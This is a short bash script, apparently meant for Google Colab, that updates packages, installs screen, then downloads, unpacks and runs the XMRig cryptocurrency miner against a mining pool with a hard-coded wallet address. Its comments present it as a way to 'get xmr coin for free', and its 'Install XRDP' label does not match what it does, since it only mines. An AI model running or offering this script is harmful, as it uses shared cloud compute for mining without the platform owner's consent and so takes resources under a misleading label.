# get-RTM
#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-bionic-x64.tar.gz
tar xvzf xmrig-6.16.4-bionic-x64.tar.gz
cd xmrig-6.16.4
./xmrig --donate-level 5 --algo ghostrider -o asia.flockpool.com:4444 -u RBGVkjYYfr8DA44RpMvkWV4FJFgxpF3VPz -p x -k --tls --rig-id GC-US
